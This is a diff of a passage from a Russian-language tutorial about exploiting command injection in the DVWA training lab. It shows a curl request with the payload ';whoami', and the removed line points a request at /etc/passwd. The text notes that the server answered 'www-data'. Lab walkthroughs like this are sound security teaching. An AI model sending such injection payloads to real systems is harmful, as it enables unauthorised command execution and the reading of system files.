@@ -22,7 +22,7 @@
 Я буду атаковать прямо из консоли Kali через `curl`. Для этого я залогинился в DVWA через браузер хоста, вытащил свои куки (`PHPSESSID`) и подставил их в запрос вместе с вредоносной нагрузкой `;whoami`:
 
 ```bash
-curl -s -b "PHPSESSID=6e020b25981d1b7ba9dd174cd74a8d29; security=low" --data "ip=127.0.0.1;whoami&Submit=Submit" "http://192.168.1.74/vulnerabilities/fi/?page=/etc/passwd"
+curl -s -b "PHPSESSID=c9dd9cfad98d264eee950bbbf6be5d77; security=low" --data "ip=127.0.0.1;whoami&Submit=Submit" "http://192.168.1.74/vulnerabilities/exec/"
 ```
 
 Сервер успешно съел запрос. На экране среди кучи HTML-тегов DVWA вернул статистику пинга, а прямо под ней — чистый текст ответа операционной системы: `www-data`. Это значит, что код выполнился!
